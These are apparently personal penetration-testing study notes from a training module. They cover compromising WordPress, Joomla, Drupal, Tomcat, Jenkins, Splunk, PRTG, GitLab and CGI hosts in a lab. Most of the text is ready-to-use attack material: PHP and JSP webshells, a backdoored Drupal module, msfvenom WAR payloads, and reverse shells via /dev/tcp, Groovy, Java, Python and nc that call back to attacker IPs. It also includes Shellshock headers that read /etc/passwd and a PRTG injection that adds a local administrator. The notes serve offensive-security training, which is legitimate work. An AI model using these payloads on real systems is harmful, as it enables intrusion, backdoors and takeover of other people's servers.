# Attacking Common Applications

Web applications are interactive applications that can be accessed via web browsers. While we may encounter vulnerable versions of many common applications that suffer from known (public) vulnerabilities such as SQL injection, XSS, remote code execution bugs, local file read, and unrestricted file upload, it is equally important for us to understand how we can abuse the built-in functionality of many of these applications to achieve remote code execution.

| **Category**                                                                                                               | **Applications**                                                       |
| -------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------- |
| [Web Content Management](https://enlyft.com/tech/web-content-management)                                                   | Joomla, Drupal, WordPress, DotNetNuke, etc.                            |
| [Application Servers](https://enlyft.com/tech/application-servers)                                                         | Apache Tomcat, Phusion Passenger, Oracle WebLogic, IBM WebSphere, etc. |
| [Security Information and Event Management (SIEM)](https://enlyft.com/tech/security-information-and-event-management-siem) | Splunk, Trustwave, LogRhythm, etc.                                     |
| [Network Management](https://enlyft.com/tech/network-management)                                                           | PRTG Network Monitor, ManageEngine Opmanger, etc.                      |
| [IT Management](https://enlyft.com/tech/it-management-software)                                                            | Nagios, Puppet, Zabbix, ManageEngine ServiceDesk Plus, etc.            |
| [Software Frameworks](https://enlyft.com/tech/software-frameworks)                                                         | JBoss, Axis2, etc.                                                     |
| [Customer Service Management](https://enlyft.com/tech/customer-service-management)                                         | osTicket, Zendesk, etc.                                                |
| [Search Engines](https://enlyft.com/tech/search-engines)                                                                   | Elasticsearch, Apache Solr, etc.                                       |
| [Software Configuration Management](https://enlyft.com/tech/software-configuration-management)                             | Atlassian JIRA, GitHub, GitLab, Bugzilla, Bugsnag, Bitbucket, etc.     |
| [Software Development Tools](https://enlyft.com/tech/software-development-tools)                                           | Jenkins, Atlassian Confluence, phpMyAdmin, etc.                        |
| [Enterprise Application Integration](https://enlyft.com/tech/enterprise-application-integration)                           | Oracle Fusion Middleware, BizTalk Server, Apache ActiveMQ, etc.        |
|                                                                                                                            |                                                                        |
Throughout the module sections, we will refer to URLs such as `http://app.inlanefreight.local`
```sh
IP=10.129.233.214
printf "%s\t%s\n\n" "$IP" "app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local" | sudo tee -a /etc/hosts
```

## Discovery and Enumeration
Web Discovery
```sh
nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
```
Two phenomenal tools that every tester should have in their arsenal are [EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness) and [Aquatone](https://github.com/michenriksen/aquatone). Both of these tools can be fed raw Nmap XML scan output (Aquatone can also take Masscan XML; EyeWitness can take Nessus XML output) and be used to quickly inspect all hosts running web applications and take screenshots of each

## Getting Organized
Tips:
- Create subsection for the scope, scans, app ss, and notable hosts to dig more into later
- Timestamp every scan and save all output and exact scan syntax that was performed

Common template:
- `Client Points of Contact`
- `Credentials`
- `Discovery/Enumeration`
	- `Scans`
	    - `Live hosts`
	- `Application Discovery`
	    - `Scans`
	    - `Interesting/Notable Hosts`
	- `Exploitation
	    - `<Hostname or IP>`
	    - `<Hostname or IP>`
	- `Post-Exploitation`
	    - `<Hostname or IP>`
	    - `<Hostname or IP>`

We can start with an Nmap scan of common web ports. I'll typically do an initial scan with ports `80,443,8000,8080,8180,8888,10000` and then run either EyeWitness or Aquatone (or both depending on the results of the first) against this initial scan. While reviewing the screenshot report of the most common ports, I may run a more thorough Nmap scan against the top 10,000 ports or all TCP ports, depending on the size of the scope. Since enumeration is an iterative process, we will run a web screenshotting tool against any subsequent Nmap scans we perform to ensure maximum coverage.

On a non-evasive full scope penetration test, I will usually run a Nessus scan too to give the client the most bang for their buck, but we must be able to perform assessments without relying on scanning tools. Even though most assessments are time-limited (and often not scoped appropriately for the size of the environment), we can provide our clients maximum value by establishing a repeatable and thorough enumeration methodology that can be applied to all environments we cover. We need to be efficient during the information gathering/discovery stage while not taking shortcuts that could leave critical flaws undiscovered. Everyone's methodology and preferred tools will vary a bit, and we should strive to create one that works well for us while still arriving at the same end goal.

All scans we perform during a non-evasive engagement are to gather data as inputs to our manual validation and manual testing process. We should not rely solely on scanners as the human element in penetration testing is essential. We often find the most unique and severe vulnerabilities and misconfigurations only through thorough manual testing.

```sh
sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list 

# enumerate one of the hosts
sudo nmap --open -sV 10.129.201.50
```

Take screenshots using eyewitness
```sh
sudo apt install eyewitness

eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
```

Aquatone
```sh
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip

unzip aquatone_linux_amd64_1.7.0.zip

cat web_discovery.xml | ./aquatone -nmap
```

During an assessment, I would continue reviewing the report, noting down interesting hosts, including the URL and application name/version for later. ==It is important at this point to remember that we are still in the information gathering phase, and every little detail could make or break our assessment==. We should not get careless and begin attacking hosts right away, as we may end up down a rabbit hole and miss something crucial later in the report. During an External Penetration Test, I would expect to see a mix of custom applications, some CMS, perhaps applications such as Tomcat, Jenkins, and Splunk, remote access portals such as Remote Desktop Services (RDS), SSL VPN endpoints, Outlook Web Access (OWA), O365, perhaps some sort of edge network device login page, etc.

Your mileage may vary, and sometimes we will come across applications that absolutely should not be exposed, such as a single page with a file upload button

During an Internal Penetration Test, we will see much of the same but often also see many ==printer login pages (which we can sometimes leverage to obtain cleartext LDAP credentials)==, ESXi and vCenter login portals, iLO and iDRAC login pages, a plethora of network devices, IoT devices, IP phones, internal code repositories, SharePoint and custom intranet portals, security appliances, and much more

## CMS

### Wordpress
#### Enumeration
A quick way to identify a WordPress site is by browsing to the `/robots.txt` file

WordPress stores its plugins in the `wp-content/plugins` directory. This folder is helpful to enumerate vulnerable plugins. Themes are stored in the `wp-content/themes` directory. These files should be carefully enumerated as they may lead to RCE.

There are five types of users on a standard WordPress installation.
1. Administrator: This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.
2. Editor: An editor can publish and manage posts, including the posts of other users.
3. Author: They can publish and manage their own posts.
4. Contributor: These users can write and manage their own posts but cannot publish them.
5. Subscriber: These are standard users who can browse posts and edit their profiles.

Enumeration
```sh
curl -s http://blog.inlanefreight.local | grep WordPress
curl -s http://blog.inlanefreight.local/ | grep themes
curl -s http://blog.inlanefreight.local/ | grep plugins
```

Browse to the plugins and check version in readme.txt

Automate: Use WPScan ([Further](obsidian://open?vault=Obsidian%20Vault&file=Ambis%2FHTB%20Acad%20Notes%2FHacking%20Wordpress%20%E2%9C%85))
```sh
sudo gem install wpscan

sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>
```

Manual to find hidden plugins or anything
```sh
gobuster dir -u http://blog.inlanefreight.local/wp-content/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

#### Attacking
##### Login bruteforce
```sh
sudo wpscan --password-attack xmlrpc -t 20 -U doug -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

##### Code execution: 
add webshell to 404.php (with admin access)
```php
<?php
/* ... */

system($_GET[0]);
```
access the webshell
```sh
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

Metasploit `wp_admin_shell_upload` (username-password should be provided)
```msf
use exploit/unix/webapp/wp_admin_shell_upload 
```

Vulnerable plugins:
- mail-masta LFI
	- `curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`
- wpDiscuz ([exploit](https://www.exploit-db.com/exploits/49967))
	- `python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1`
	- `[+] Upload Success... Webshell path:url&quot;:&quot;http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php&quot; `
	- `curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id`

### Joomla

#### Enumeration
Footprinting
```sh
curl -s http://dev.inlanefreight.local/ | grep Joomla
```

There's also some hint in `robots.txt` or `README.txt`
```sh
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
```

In certain installs, there's even version in javascript files in `media/system/js/`  directory or
```sh
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
```
The `cache.xml` file can help to give us the approximate version. It is located at `plugins/system/cache/cache.xml`

droopescan tool
```sh
sudo pip3 install droopescan

droopescan scan joomla --url http://dev.inlanefreight.local/
```

brute-force login ([script](https://github.com/ajnik/joomla-bruteforce))
```sh
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

#### Attack
Target backend: `/administrator`

##### Abusing built-in functionality 
In Templates > protostar (any) > Templates: Customise (/administrator/index.php?option=com_templates&view=template&id=506)
```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```
then
```sh
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```
We should be sure, once again, to note down this change for our report appendices and make every effort to remove the PHP snippet from the `error.php` page.

##### Leveraging known vulnerabilities
 [CVE-2019-10945](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945): directory traversal and authenticated file deletion vulnerability ([exploit](https://www.exploit-db.com/exploits/46710)/[exploit python3](https://github.com/dpgg101/CVE-2019-10945))

**Note**: If you receive an error stating "An error has occurred. Call to a member function format() on null" after logging in, navigate to "http://dev.inlanefreight.local/administrator/index.php?option=com_plugins" and disable the "Quick Icon - PHP Version Check" plugin. This will allow the control panel to display properly.

### Drupal
#### Enumeration
A Drupal website can be identified in several ways, including:
- Header/footer "Powered by Drupal"
- Standard Drupal logo
- Presence of a `CHANGELOG.txt` file or `README.txt file`
- Via page source
- Clues in robots.txt such as references to `/node`
```sh
curl -s http://drupal.inlanefreight.local | grep Drupal
```

Drupal indexes its content using nodes. A node can hold anything such as a blog post, poll, article, etc. The page URIs are usually of the form `/node/<nodeid>`

3 types of users in Drupal:
1. Administrator
2. Authenticated user
3. Anonymous

Identify version number
```sh
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
# Drupal 7.57, 2018-02-21
```

Scan
```sh
pip3 install droopescan
droopescan scan drupal -u http://drupal.inlanefreight.local
```

#### Attack
##### Leveraging PHP filter module
In older versions of Drupal (<8), it was possible to log in as an admin and enable the `PHP filter` module

We can now create page with malicious PHP snippet
```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```
We named the parameter with an md5 hash instead of the common `cmd` to get in the practice of ==not potentially leaving a door open to an attacker during our assessment==

```sh
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

From version 8 onwards, the [PHP Filter](https://www.drupal.org/project/php/releases/8.x-1.1) module is not installed by default. To leverage this functionality, we would have to install the module ourselves.

##### Uploading a Backdoored Module
Drupal allows users with appropriate permissions to upload a new module, we can upload the backdoored one by adding shell to it.

Download, extract the contents
```sh
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
Create webshell (shell.php)
```php
<?php system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']); ?>
```
Create .htaccess file
```xml
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
Copy both to captcha folder, create archive
```sh
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
Install in `/admin/modules/install`. Once the installation succeeds, browse to `/modules/captcha/shell.php` to execute commands.
```sh
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

##### Leveraging known vulnerabilities
- [CVE-2014-3704](https://www.drupal.org/SA-CORE-2014-005), known as Drupalgeddon, affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.
- [CVE-2018-7600](https://www.drupal.org/sa-core-2018-002), also known as Drupalgeddon2, is a remote code execution vulnerability, which affects versions of Drupal prior to 7.58 and 8.5.1. The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected.
- [CVE-2018-7602](https://cvedetails.com/cve/CVE-2018-7602/), also known as Drupalgeddon3, is a remote code execution vulnerability that affects multiple versions of Drupal 7.x and 8.x. This flaw exploits improper validation in the Form API.

### Tomcat

Tomcat servers can be identified by the Server header in the HTTP response. Requesting an invalid page should reveal server and version.

If page doesn't leak version, see `/docs` page
```sh
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 
```

The most important file among the files is WEB-INF/web.xml, which stores information about routes and the classes handling these routes.

Sample web.xml file
```xml
<web-app>
  <servlet>
    <servlet-name>AdminServlet</servlet-name>
    <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>AdminServlet</servlet-name>
    <url-pattern>/admin</url-pattern>
  </servlet-mapping>
</web-app>   
```
Path on the disk: - `classes/com/inlanefreight/api/AdminServlet.class`

tomcat-users.xml: allow or disallow access to the `/manager` and `host-manager` admin pages.
#### Enumeration
Locate `/manager` or `/host-manager` pages, or:
```sh
gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 
```

#### Attack
If we can access the `/manager` or `/host-manager` endpoints, we can likely achieve remote code execution on the Tomcat server.

##### Brute-force
Let's start by brute-forcing the Tomcat manager page on the Tomcat instance at `http://web01.inlanefreight.local:8180`. We can use the [auxiliary/scanner/http/tomcat_mgr_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login/) Metasploit module for these purposes. We can also use [this](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce) Python script to achieve the same result.

```
set VHOST web01.inlanefreight.local
set RPORT 8180
set stop_on_success true
set rhosts 10.129.201.58
```

##### WAR file upload
Many Tomcat installations provide a GUI interface to manage the application. This interface is available at `/manager/html` by default,  which only users assigned the `manager-gui` role are allowed to access.

Browse to `/manager/html` to login, then deploy new app by uploading WAR files. A JSP web shell such as [this](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) can be downloaded and placed within the archive.
```sh
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
```
Then `/backup` will be added to the table.

Browsing to `http://web01.inlanefreight.local:8180/backup/cmd.jsp` will present us with a web shell that we can use to run commands on the Tomcat server.
```sh
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
```
To clean up after ourselves, we can go back to the main Tomcat Manager page and click the `Undeploy` button next to the `backups` application after.

We could also use ===`msfvenom`=== to generate a malicious WAR file. The payload [java/jsp_shell_reverse_tcp](https://github.com/iagox86/metasploit-framework-webexec/blob/master/modules/payloads/singles/java/jsp_shell_reverse_tcp.rb) will execute a reverse shell through a JSP file.
```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war

nc -lnvp 4443
```

The [multi/http/tomcat_mgr_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/) Metasploit module can be used to automate the process shown above.

**Note**: When upload web shell, we want to prevent unauthorized access. We should take certain measures such as a randomized file name (i.e., MD5 hash), limiting access to our source IP address, and even password protecting it. We don't want an attacker to come across our web shell and leverage it to gain their own foothold.

##### CVE-2020-1938 : Ghostcat
All Tomcat versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable. The AJP service is usually running at port 8009 on a Tomcat server.

```sh
nmap -sV -p 8009,8080 app-dev.inlanefreight.local
```

The PoC code for the vulnerability can be found [here](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi). The exploit can only read files and folders within the web apps folder.
```sh
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
```

### Jenkins
[Jenkins](https://www.jenkins.io/) is an open-source automation server written in Java that helps developers build and test their software projects continuously. Jenkins runs on Tomcat port 8080 by default. It also utilizes port 5000 to attach slave servers. This port is used to communicate between masters and slaves. Jenkins can use a local database, LDAP, Unix user database, delegate security to a servlet container, or use no authentication at all. Administrators can also allow or disallow users from creating accounts.

#### Enumeration
The default installation typically uses Jenkins’ database to store credentials and does not allow users to register an account. 

Fingerprint Jenkins quickly by the telltale login page (`/login`). It is not uncommon to find Jenkins instances that do not require any authentication during an internal penetration test.

#### Attack
##### Script console
Using this script console, it is possible to run arbitrary commands, functioning similarly to a web shell.
```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```
There are various ways that access to the script console can be leveraged to gain a **reverse shell**. For example, using the command below, or [this](https://web.archive.org/web/20230326230234/https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console/) Metasploit module.
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
```sh
nc -lvnp 8443
```

Against Windows host, we could add users and connect to host via RDP/WinRM
```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

We could also use [this](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy) Java reverse shell to gain command execution on a Windows host, swapping out `localhost` and the port for our IP address and listener port.

```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

##### Misc. Vulns
One recent exploit combines two vulnerabilities, CVE-2018-1999002 and [CVE-2019-1003000](https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266) to achieve pre-authenticated RCE. Works against Jenkins version 2.137.
Another vulnerability exists in Jenkins 2.150.2, which allows users with JOB creation and BUILD privileges to execute code on the system via Node.js

## Infrastructure/Network Monitoring Tools

### Splunk
Splunk is a log analytics tool used to gather, analyze and visualize data. Though not originally intended to be a SIEM tool, Splunk is often used for security monitoring and business analytics.

The biggest focus of Splunk during an assessment would be weak or null authentication because admin access to Splunk gives us the ability to deploy custom applications that can be used to quickly compromise a Splunk server and possibly other hosts in the network depending on the way Splunk is set up.

#### Enumeration
The Splunk web server runs by default on port 8000. On older versions of Splunk, the default credentials are `admin:changeme`, which are conveniently displayed on the login page. If the default credentials do not work, it is worth checking for common weak passwords.

Discover Splunk, the name is `Splunkd httpd` usually on port 8000 and 8089
```sh
sudo nmap -sV 10.129.201.50
```

It is not uncommon for system administrators to install a trial of Splunk to test it out, which is subsequently forgotten about. This will automatically convert to the free version that does not have any form of authentication, introducing a security hole in the environment.

Once logged in to Splunk (or having accessed an instance of Splunk Free), we can browse data, run reports, create dashboards, install applications from the Splunkbase library, and install custom applications.

Splunk has suffered from various public vulnerabilities over the years, such as this [SSRF](https://www.exploit-db.com/exploits/40895) that could be used to gain unauthorized access to the Splunk REST API

#### Attack
##### Abusing built-in functionality
We can use [this](https://github.com/0xjpuff/reverse_shell_splunk) Splunk package to assist us. The `bin` directory in this repo has examples for [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) and [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1). Change the IP and port in `bin` folder

The [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) file tells Splunk which script to run and any other conditions. Here we set the app as enabled and tell Splunk to run the script every 10 seconds. The interval is always in seconds, and the input (script) will only run if this setting is present.

```shell-session
[!bash!]$ cat inputs.conf 

[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

Create the tarball
```sh
$ tar -cvzf updater.tar.gz reverse_shell_splunk/

splunk_shell/
splunk_shell/bin/
splunk_shell/bin/rev.py
splunk_shell/bin/run.bat
splunk_shell/bin/run.ps1
splunk_shell/default/
splunk_shell/default/inputs.conf
```

Create reverse shell, then upload the app.

If we were dealing with a Linux host, we would need to edit the `rev.py` Python script before creating the tarball and uploading the custom malicious app
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

If the compromised Splunk host is a deployment server, it will likely be possible to achieve RCE on any hosts with Universal Forwarders installed on them. To push a reverse shell out to other hosts, the application must be placed in the `$SPLUNK_HOME/etc/deployment-apps` directory on the compromised host.

After uploaded, the listener will **automatically** connected to the shell

### PRTG Network Monitor
[PRTG Network Monitor](https://www.paessler.com/prtg) is agentless network monitor software. It can be used to monitor bandwidth usage, uptime and collect statistics from various hosts, including routers, switches, servers, and more. It works with an autodiscovery mode to scan areas of a network and create a device list. Once this list is created, it can gather further information from the detected devices using protocols such as ICMP, SNMP, WMI, NetFlow, and more. Devices can also communicate with the tool via a REST API.

#### Enumeration
PTRG can typically be found on common web ports such as 80, 443, or 8080 as service `Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)` usually in port 8080. It is possible to change the web interface port in the Setup section when logged in as an admin. Default credentials: `prtgadmin:prtgadmin`.

Enumerate version other than nmap
```sh
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
```

#### Attack
When we create new notification, the parameter field is passed directly into powershell without sanitization. 
Setup > Account Settings > Notifications, Add new notification

Tick the box next to `EXECUTE PROGRAM`. Under `Program File`, select `Demo exe notification - outfile.ps1` from the drop-down. Finally, in the parameter field, enter a command. For our purposes, we will add a new local admin user by entering 
```powershell
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```
Then click the `Test` button to run our notification and execute the command to add a local admin user.

We can use crackmapexec to confirm local admin access.
```sh
sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG! 
```
We could also try to RDP to the box, access over WinRM, or use a tool such as [evil-winrm](https://github.com/Hackplayers/evil-winrm) or something from the [impacket](https://github.com/SecureAuthCorp/impacket) toolkit such as `wmiexec.py` or `psexec.py`.

```sh
evil-winrm -i 10.129.122.79 -u prtgadm1 -p Pwn3d_by_PRTG!
```

## Customer Service Management & Configuration Management

### osTicket
[osTicket](https://osticket.com/) is an open-source support ticketing system. osTicket is written in PHP and uses a MySQL backend. It can be installed on Windows or Linux.
#### Enumeration
An Nmap scan will just show information about the webserver, such as Apache or IIS, and will not help us footprint the application.

#### Attack
A search for osTicket on exploit-db shows various issues, including remote file inclusion, SQL injection, arbitrary file upload, XSS, etc. osTicket version 1.14.1 suffers from [CVE-2020-24881](https://nvd.nist.gov/vuln/detail/CVE-2020-24881) which was an SSRF vulnerability.

1. Many companies have support email and email sent are available in online support portals
2. If we can submit new ticket, we may be able to obtain valid company email address
3. If the company set up their helpdesk software to correlate ticket numbers with emails, then any email sent to the email we received when registering, `940288@inlanefreight.local`, would show up here
4. With this setup, if we can find an external portal such as a Wiki, chat service, or a Git repository, we may be able to use this email to register an account and the help desk support portal to receive a sign-up confirmation email

##### Sensitive Data Exposure
Discover several user credentials
```shell-session
sudo python3 dehashed.py -q inlanefreight.local -p
```

Login using re-used credentials, or found reset credentials. Many applications such as osTicket also contain an address book. Login to `/scp/login`  (I'm an agent)

### Gitlab
We may also find scripts or configuration files that were accidentally committed containing cleartext secrets such as passwords that we may use to our advantage. We can attempt to use the search function to search for users, passwords, etc.
Most companies will only allow a user with a company email address to register and require an administrator to authorize the account, but as we'll see later on, a GitLab instance can be set up to allow anyone to register and then log in.

#### Enumeration
Browse to `/help` to see version (must logged in)
Browse to `/explore` to see public

We can create new account.
#### Attack

##### Username Enumeration
We can write one ourselves in Bash or Python or use [this one](https://www.exploit-db.com/exploits/49821) to enumerate a list of valid users. The Python3 version of this same tool can be found [here](https://github.com/dpgg101/GitLabUserEnum). In versions below 16.6, GitLab's defaults are set to ==10 failed login attempts==, resulting in an automatic unlock after 10 minutes.

Eh, just use ffuf
```sh
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://gitlab.inlanefreight.local:8081/FUZZ -fc 302
```

##### Authenticated RCE
GitLab Community Edition version 13.10.2 and lower suffered from an authenticated remote code execution [vulnerability](https://hackerone.com/reports/1154542) due to an issue with ExifTool handling metadata in uploaded image files. This issue was fixed by GitLab rather quickly, but some companies are still likely using a vulnerable version. We can use this [exploit](https://www.exploit-db.com/exploits/49951) to achieve RCE.
```sh
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u hemker -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.218 4443 >/tmp/f '
```

## Common Gateway Interface (CGI)

The CGI Servlet is a vital component of Apache Tomcat that enables web servers to communicate with external applications beyond the Tomcat JVM. These external applications are typically CGI scripts written in languages like Perl, Python, or Bash. The CGI Servlet receives requests from web browsers and forwards them to CGI scripts for processing. It is a middleware between web servers and external information resources like databases.
### Tomcat
`CVE-2019-0232` remote code execution. This vulnerability affects Windows systems that have the `enableCmdLineArguments` feature enabled

Find CGI script
```sh
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
```
Since the operating system is Windows, we aim to fuzz for batch scripts, so either use `.cmd` or `.bat`

We can exploit `CVE-2019-0232` by appending our own commands through the use of the batch command separator `&`
```
http://10.129.204.227:8080/cgi/welcome.bat?&dir
```
If it doesn't work, we can retrieve env var using `set`. If PATH variable doesn't exist, use hardcode paths in requests.
```
http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
```
Apache Tomcat introduced a patch that utilises a regular expression to prevent the use of special characters.

Bypass using URL encoding
```http
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

### Shellshock
CGI scripts and programs are kept in the `/CGI-bin` directory on a web server and can be written in C, C++, Java, PERL, etc. CGI scripts run in the security context of the web server

CGI scripts/applications are typically used for a few reasons:
- Webserver must dynamically interact with the user
- When the user submits data to web server, the CGI process the data

Disadvantages to using CGI: It starts a new process for each HTTP request which can take up a lot of server memory. A new database connection is opened each time. Data cannot be cached between page loads which reduces efficiency.

Shellshock: security flaw in the Bash shell (<=4.3) that can be used to execute unintentional commands using environment variables.

Shellshock vulnerability allows an attacker to exploit old versions of Bash that save environment variables incorrectly. Test if imported env will execute command.
```sh
env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```
This behavior no longer occurs on a patched system, as Bash will not execute code after a function definition is imported. Furthermore, Bash will no longer interpret `y=() {...}` as a function definition. But rather, function definitions within environment variables must now be prefixed with `BASH_FUNC_`.

#### Enumeration
Hunt for CGI scripts
```sh
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```

Confirm the vuln using user-agent field
```sh
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```
#### Attack
Reverse shell
```sh
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```

#### Mitigation
- Update version of Bash
- If org. accept the risk, firewalling off the host on the internal network as best as possible

### Thick Client Applications
Thick client applications are the applications that are installed locally on our computers. Unlike thin client applications that run on a remote server and can be accessed through the web browser, these applications do not require internet access to run. Thick client applications are usually applications used in enterprise environments created to serve specific purposes. Example: Web browser, media player, chatting software, video games.

2 types:
- 2-tier: App directly communicate to database
- 3-tier: App has application server to communicate with database

Web-specific vulnerabilities like XSS, CSRF, and Clickjacking, do not apply to thick client applications. However, thick client applications are considered less secure than web applications with many attacks being applicable, including:
- Improper Error Handling.
- Hardcoded sensitive data.
- DLL Hijacking.
- Buffer Overflow.
- SQL Injection.
- Insecure Storage.
- Session Management.

#### Enumeration
Information gathering tool: manual (obv.), [CFF Explorer](https://ntcore.com/?page_id=388), [Detect It Easy](https://github.com/horsicq/Detect-It-Easy), [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon), [Strings](https://learn.microsoft.com/en-us/sysinternals/downloads/strings)

#### Attacking
Client side attacks: command injection, weak access control,  SQL injection. Using the proper tools, we can reverse-engineer and examine .NET and Java applications including EXE, DLL, JAR, CLASS, WAR, and other file formats. Dynamic analysis should also be performed in this step, as thick client applications store sensitive information in the memory as well.

|[Ghidra](https://www.ghidra-sre.org/)|[IDA](https://hex-rays.com/ida-pro/)|[OllyDbg](http://www.ollydbg.de/)|[Radare2](https://www.radare.org/r/index.html)|
|[dnSpy](https://github.com/dnSpy/dnSpy)|[x64dbg](https://x64dbg.com/)|[JADX](https://github.com/skylot/jadx)|[Frida](https://frida.re/)|

Network side attacks: network traffic analysis will help us capture sensitive information that might be transferred through HTTP/HTTPS or TCP/UDP connection, and give us a better understanding of how that application is working.

